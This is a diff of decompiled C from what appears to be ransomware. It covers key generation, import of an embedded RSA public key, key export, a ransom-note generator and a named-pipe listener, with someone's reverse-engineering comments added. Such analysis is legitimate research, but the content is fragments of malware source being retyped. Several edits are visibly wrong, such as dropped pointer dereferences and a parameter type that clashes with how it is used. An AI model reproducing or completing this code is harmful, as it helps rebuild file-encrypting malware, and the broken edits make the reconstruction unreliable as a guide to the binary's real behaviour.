@@ -746,22 +746,27 @@ bool CryptoGenerateKey(int a1)
 }
 
 //----- (681F1BA0) --------------------------------------------------------
-BOOL __stdcall ImportPubKey(int a1)
+BOOL __stdcall ImportPubKey(LPCWSTR a1) //I think this takes in struct. // oddities: LocalAlloc expects HLOCAL and this is used later on in CtyptStringToBinaryW which expects BYTE *
 {
 	const WCHAR *v1; // ST08_4
-	BYTE *v2; // ebx
-	BYTE *v3; // eax
+	HLOCAL v2; // ebx
+	HLOCAL v3; // eax
+
+	//BYTE* v2; // ebx //orig
+	//BYTE* v3; // eax //orig
+
+
 	BOOL v5; // [esp+8h] [ebp-14h]
 	BYTE *pbData; // [esp+10h] [ebp-Ch]
 	DWORD pcbStructInfo; // [esp+14h] [ebp-8h]
 	DWORD pcbBinary; // [esp+18h] [ebp-4h]
 
-	v1 = *(a1 + 16);
+	v1 = (a1 + 16); // 4rd item in struct?
 	v5 = 0;
 	pcbBinary = 0;
 	if (CryptStringToBinaryW(v1, 0, 1u, 0, &pcbBinary, 0, 0))
 	{
-		v2 = LocalAlloc(0x40u, pcbBinary);
+		v2 = LocalAlloc(0x40u, pcbBinary); 
 		if (v2)
 		{
 			if (CryptStringToBinaryW(
@@ -771,19 +776,21 @@ BOOL __stdcall ImportPubKey(int a1)
 				"CeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB",
 				0,
 				1u,
-				v2,
+				(BYTE *)v2,
+				//v2, // orig
 				&pcbBinary,
 				0,
 				0))
 			{
 				pcbStructInfo = 0;
-				if (CryptDecodeObjectEx(0x10001u, 0x13, v2, pcbBinary, 0, 0, 0, &pcbStructInfo))
+				if (CryptDecodeObjectEx(0x10001u, X509_BASIC_CONSTRAINTS, (BYTE *)v2, pcbBinary, 0, 0, 0, &pcbStructInfo))
 				{
 					v3 = LocalAlloc(0x40u, pcbStructInfo);
-					pbData = v3;
+					//pbData = v3; // orig
+					pbData = (BYTE *)v3;
 					if (v3)
 					{
-						if (CryptDecodeObjectEx(0x10001u, 0x13, v2, pcbBinary, 0, 0, v3, &pcbStructInfo))
+						if (CryptDecodeObjectEx(0x10001u, X509_BASIC_CONSTRAINTS, (BYTE *) v2, pcbBinary, 0, 0, v3, &pcbStructInfo))
 							v5 = CryptImportKey(*(a1 + 8), pbData, pcbStructInfo, 0, 0, (a1 + 12));
 						LocalFree(pbData);
 					}
@@ -796,22 +803,22 @@ BOOL __stdcall ImportPubKey(int a1)
 }
 
 //----- (681F1C7F) --------------------------------------------------------
-HLOCAL  CryptoExportKey(int a1)
+HLOCAL  CryptoExportKey(int a1) // This looks to me like it takes in struct and pulls items from it.
 {
 	int v1; // esi
 	HCRYPTKEY v2; // ST04_4
 	HCRYPTKEY v3; // ST00_4
 	BYTE *v4; // eax
-	HLOCAL v5; // edi
+	LPWSTR v5; // edi
 	HLOCAL v7; // [esp+Ch] [ebp-10h]
 	BYTE *pbBinary; // [esp+10h] [ebp-Ch]
 	DWORD pcchString; // [esp+14h] [ebp-8h]
 	DWORD pdwDataLen; // [esp+18h] [ebp-4h]
 
 	v1 = a1;
-	v2 = *(a1 + 12);
+	v2 = *(a1 + 12);// 3rd item from struct
 	v7 = 0;
-	v3 = *(a1 + 20);
+	v3 = *(a1 + 20);// 5th item from struct. 
 	pdwDataLen = 0;
 	if (CryptExportKey(v3, v2, 1u, 0, 0, &pdwDataLen))
 	{
@@ -844,7 +851,7 @@ HLOCAL  CryptoExportKey(int a1)
 HLOCAL __stdcall GenerateReadMeMessage(LPCWSTR pszDir)
 {
 	HLOCAL result; // eax
-	DWORD v2; // eax
+	int v2; // eax
 	HANDLE v3; // ebx
 	WCHAR pszDest; // [esp+0h] [ebp-620h]
 	LPCVOID lpBuffer; // [esp+618h] [ebp-8h]
@@ -5214,7 +5221,7 @@ int __stdcall CleanUpHeaps_2(void *Src, void *a2)
 }
 
 //----- (681F6DE0) --------------------------------------------------------
-int __stdcall CleanUpHeaps(void *Src, void *a2, int a3)
+int __stdcall CleanUpHeaps(const wchar_t *Src, const wchar_t *a2, int a3)
 {
 	struct _RTL_CRITICAL_SECTION *v3; // ebx
 	unsigned int v4; // kr00_4
@@ -5693,7 +5700,7 @@ signed int  CreateFileAndWrite(const WCHAR *a1, LPCWSTR lpFileName, LPCVOID lpBu
 }
 
 //----- (681F73FD) --------------------------------------------------------
-DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
+DWORD __stdcall StartAddress(LPCWSTR lpThreadParameter)
 {
 	HANDLE v1; // eax
 	void *v2; // eax
@@ -5702,7 +5709,7 @@ DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
 	DWORD v5; // ST1C_4
 	HANDLE v6; // eax
 	void *v7; // edi
-	_WORD *v8; // eax
+	void* v8; // eax
 	HANDLE v9; // eax
 	struct _SECURITY_ATTRIBUTES SecurityAttributes; // [esp+Ch] [ebp-18h]
 	DWORD NumberOfBytesRead; // [esp+18h] [ebp-Ch]
@@ -5723,7 +5730,7 @@ DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
 		LABEL_4:
 			v3 = CreateNamedPipeW(lpThreadParameter, 3u, 6u, 1u, 0, 0, 0, &SecurityAttributes);
 			hNamedPipe = v3;
-		} while (v3 == -1);
+		} while (v3 == INVALID_HANDLE_VALUE);
 		if (!ConnectNamedPipe(v3, 0))
 			goto LABEL_19;
 		v4 = 30;
@@ -5744,11 +5751,12 @@ DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
 						if (ReadFile(hNamedPipe, v7, TotalBytesAvail, &NumberOfBytesRead, 0)
 							&& NumberOfBytesRead == TotalBytesAvail)
 						{
-							v8 = StrChrW(v7, 58);
+							v8 = StrChrW((PCWSTR)v7, 58);
 							if (v8)
 							{
-								*v8 = 0;
-								CleanUpHeaps(v7, v8 + 1, 2);
+								v8 = 0;
+								//CleanUpHeaps(v7,v8 + 1, 2); //orig
+								CleanUpHeaps((const wchar_t*)v7, (const wchar_t *)v8 + 1, 2);// Looks to clean up VOID * which is populated with WCHARS
 							}
 						}
 						v9 = GetProcessHeap();
